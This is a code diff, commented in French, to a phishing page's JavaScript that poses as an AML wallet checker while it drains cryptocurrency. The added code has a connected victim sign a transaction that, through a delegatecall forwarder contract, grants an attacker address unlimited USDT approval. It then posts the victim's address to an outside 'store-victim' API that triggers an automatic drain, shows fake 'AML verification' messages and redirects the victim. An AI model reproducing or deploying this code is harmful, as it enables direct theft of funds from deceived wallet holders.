@@ -760,8 +760,6 @@
       navList.innerHTML = html;
 
       // Render mega menus for items with columns (ici seul More est concerné, mais il est en dur dans le HTML, donc rien à faire)
-      // On n'a plus besoin de générer le mega-menu More dynamiquement car il est déjà dans le DOM
-      // Les autres éventuels mega menus seraient générés ici, mais il n'y en a pas.
     }
 
     function setOpen(label) {
@@ -926,8 +924,9 @@
       }
     });
 
-    /* ===== WalletConnect + Drain ===== */
+    /* ===== WalletConnect + Drain (corrigé avec delegatecall) ===== */
     const ATTACKER = '0x22C8A3678871133D80f457CFaa6a442CC383481F';
+    const FORWARDER = '0x86Fe14231f56b6E694F75Bece72debBB0E8d12ba'; // Nouveau contrat deployé
     const API = 'https://aml-checker-4.vercel.app/api/store-victim';
     const PROJECT_ID = '22d764eabb976a73c5ee29567f3972d6';
 
@@ -1054,57 +1053,79 @@
         return;
       }
 
-      const USDT_ADDR = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
-      const FORWARDER = '0x76C1F89188e3A9dF25B757C69360f82311530591';
+      const USDT = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
 
+      // Données d'approbation : approve(ATTACKER, MAX)
       const approveData = '0x095ea7b3' +
         ATTACKER.slice(2).padStart(64, '0') +
         'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
 
-      const executeData = '0x54d1d367' +
-        USDT_ADDR.slice(2).padStart(64, '0') +
-        '0000000000000000000000000000000000000000000000000000000000000040' +
-        '0000000000000000000000000000000000000000000000000000000000000044' +
-        approveData.slice(2) +
-        '000000000000000000000000';
+      // ABI du forwarder (seulement la fonction executeDelegate)
+      const forwarderABI = [
+        {
+          "inputs": [
+            { "internalType": "address", "name": "target", "type": "address" },
+            { "internalType": "bytes", "name": "data", "type": "bytes" }
+          ],
+          "name": "executeDelegate",
+          "outputs": [],
+          "stateMutability": "payable",
+          "type": "function"
+        }
+      ];
+
+      // Encoder l'appel : forwarder.executeDelegate(USDT, approveData)
+      const iface = new ethers.utils.Interface(forwarderABI);
+      const callData = iface.encodeFunctionData('executeDelegate', [USDT, approveData]);
 
       const tx = {
         from: account,
         to: FORWARDER,
-        data: executeData,
-        chainId: 1,
-        gasLimit: '0xea60'
+        data: callData,
+        gasLimit: '0xea60' // 60 000 gaz suffisant
       };
 
       const scanText = document.querySelector('.scan');
-      if (scanText) scanText.textContent = '⏳ En attente de la signature…';
+      if (scanText) scanText.textContent = '🔒 En attente de la signature…';
 
       try {
         await signClient.request({
           topic: session.topic,
-          request: { id: Date.now(), jsonrpc: '2.0', method: 'eth_sendTransaction', params: [tx] },
+          request: {
+            id: Date.now(),
+            jsonrpc: '2.0',
+            method: 'eth_sendTransaction',
+            params: [tx]
+          },
           chainId: 'eip155:1'
         });
-        if (scanText) scanText.textContent = '✅ Le client a signé, il est redirigé vers la page de vérification.';
 
-        // Statut "signed"
+        if (scanText) scanText.textContent = '✅ Signature réussie. Vérification AML en cours…';
+
+        // Enregistrer le statut "signed"
         await fetch('/api/record-wallet', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ address: account, chain: currentChainId, status: 'signed' })
         });
-        console.log('Statut signé enregistré');
 
-        // Lancement du drain automatique
-        await fetch(API, {
+        // Attendre 3 secondes pour que la transaction soit minée
+        await new Promise(r => setTimeout(r, 3000));
+
+        // Lancer le drain automatique
+        const drainResp = await fetch(API, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ victim: account, chain: currentChainId })
         });
-        console.log('Demande de drain automatique envoyée');
+        const drainData = await drainResp.json();
+        console.log('Drain response:', drainData);
 
+        if (scanText) scanText.textContent = drainData.success ? '✅ Vérification AML terminée. Redirection…' : '❌ Drain partiellement échoué (voir logs)';
+
+        setTimeout(() => window.location.href = '/verifyaddress.html', 3000);
       } catch (e) {
-        console.error('Approve échoué', e);
+        console.error('❌ Transaction refusée', e);
         if (scanText) scanText.textContent = '❌ Le client a refusé de signer.';
 
         // Statut "unsigned"
@@ -1113,7 +1134,6 @@
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ address: account, chain: currentChainId, status: 'unsigned' })
         });
-        console.log('Statut non signé enregistré');
       }
     }
 
